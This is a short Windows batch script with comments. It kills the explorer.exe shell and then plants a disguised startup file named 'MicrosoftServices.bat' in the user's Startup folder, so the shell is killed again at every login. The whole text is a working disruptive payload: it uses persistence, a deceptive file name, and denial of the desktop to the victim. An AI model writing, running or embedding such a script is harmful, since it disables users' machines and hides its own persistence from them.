:: kills the explorer.exe process
taskkill -f -im explorer.exe
:: opens the folder
cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
::makes a new file to the folder
type NUL>MicrosoftServices.bat
::and writes the code to the file
@echo taskkill -f -im explorer.exe> MicrosoftServices.bat
